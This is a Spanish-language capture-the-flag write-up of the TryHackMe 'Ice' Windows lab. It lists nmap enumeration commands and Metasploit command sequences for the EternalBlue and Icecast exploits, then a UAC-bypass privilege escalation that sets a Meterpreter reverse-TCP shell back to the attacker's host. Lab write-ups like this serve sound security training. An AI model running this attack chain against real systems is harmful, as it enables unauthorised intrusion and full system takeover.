---
tags:
  - Cybersecurity
  - Labs
  - TryHackMe
  - Easy
  - Windows
  - SMB
  - EternalBlue
  - Icecast
  - MSF
  - PrivilegeEscalation
---
- [[#Enumeración|Enumeración]]
	- [[#Enumeración#Ping|Ping]]
	- [[#Enumeración#Nmap|Nmap]]
	- [[#Enumeración#Searchsploit|Searchsploit]]
- [[#Explotación|Explotación]]
	- [[#Explotación#Explotación vía SMB (MS17-010 / EternalBlue)|Explotación vía SMB (MS17-010 / EternalBlue)]]
	- [[#Explotación#Explotación del servidor Icecast (CVE-2004-1561)|Explotación del servidor Icecast (CVE-2004-1561)]]
		- [[#Explotación del servidor Icecast (CVE-2004-1561)#Escalada de Privilegios|Escalada de Privilegios]]

---
# Resolviendo la máquina Ice

>En esta publicación, comparto cómo resolví la máquina **Ice** de [TryHackMe](https://tryhackme.com/room/ice).

---
## Enumeración
### Ping

Ejecutamos un *ping* para comprobar la conectividad y obtener pistas sobre el sistema operativo.

`ping -c 1 10.10.3.8`

![[Pasted image 20250723132356.png]]

*TTL=127* -> **Windows**
### Nmap

`nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.3.8 -oG allPorts`

![[Pasted image 20250723132505.png]]

`nmap -p135,139,445,3389,5357,8000,49152,49153,49154,49158,49159,49160 -sCV 10.10.3.8 -oN targeted`

![[Pasted image 20250723132608.png]]

`nmap -p445 --script smb-vuln-ms17-010 10.10.3.8`

![[Pasted image 20250723133018.png]]
### Searchsploit

`searchsploit Icecast`

![[Pasted image 20250723133244.png]]

---
## Explotación

En esta máquina existen varias formas de explotación.
### Explotación vía SMB (MS17-010 / EternalBlue)

Se utiliza el exploit (`exploit/windows/smb/ms17_010_eternalblue`) para la vulnerabilidad **MS17-010 (EternalBlue)** en el servicio **SMB**.

```
search exploit/windows/smb/ms17_010_eternalblue
use 0 | use exploit/windows/smb/ms17_010_eternalblue
show options
set RHOSTS 10.10.3.8
LHOST 10.8.184.124
exploit
```

![[Pasted image 20250723134128.png]]

`sysinfo`

![[Pasted image 20250723134159.png]]

`getuid`

![[Pasted image 20250723134234.png]]
### Explotación del servidor Icecast (CVE-2004-1561)

Se utiliza el exploit (`exploit/windows/http/icecast_header`) para explotar una vulnerabilidad en el servidor de streaming **Icecast**.

```
search exploit/windows/http/icecast_header
use 0 | use exploit/windows/http/icecast_header
show options
set RHOSTS 10.10.3.8
set LHOST 10.8.184.124
set LPORT 4445
exploit
```

`sysinfo`

![[Pasted image 20250723134724.png]]

`getuid`

![[Pasted image 20250723134747.png]]

`pgrep explorer.exe`

![[Pasted image 20250723135032.png]]

`migrate 1316`

`sysinfo`

![[Pasted image 20250723135110.png]]

`background`
#### Escalada de Privilegios

Una vez obtenida una sesión de usuario no privilegiado, se utiliza el módulo `local_exploit_suggester` para identificar posibles vectores de escalada en el sistema.

Se utiliza el exploit (`post/multi/recon/local_exploit_suggester`) para sugerir exploits locales que podrían funcionar en un sistema comprometido.

```
search post/multi/recon/local_exploit_suggester
use 0 | use post/multi/recon/local_exploit_suggester
show options
set SESSION 1
exploit
```

![[Pasted image 20250723135848.png]]

Se utiliza el exploit (`exploit/windows/local/bypassuac_eventvwr`) para escalar privilegios en sistemas **Windows** mediante una técnica de *bypass de UAC (User Account Control)*.

```
search exploit/windows/local/bypassuac_eventvwr
use 0 | use exploit/windows/local/bypassuac_eventvwr
show options
set SESSION 1
set LHOST 10.8.184.124
set LPORT 1234
set targets 1
set payload windows/x64/meterpreter/reverse_tcp
exploit
```

![[Pasted image 20250723140418.png]]

`sysinfo`

![[Pasted image 20250723140442.png]]

`getuid`

![[Pasted image 20250723140458.png]]

`getprivs`

![[Pasted image 20250723140519.png]]

`ps`

![[Pasted image 20250723140610.png]]

`pgrep spoolsv.exe`

![[Pasted image 20250723140651.png]]

`migrate 1368`

`getuid`

![[Pasted image 20250723140732.png]]

---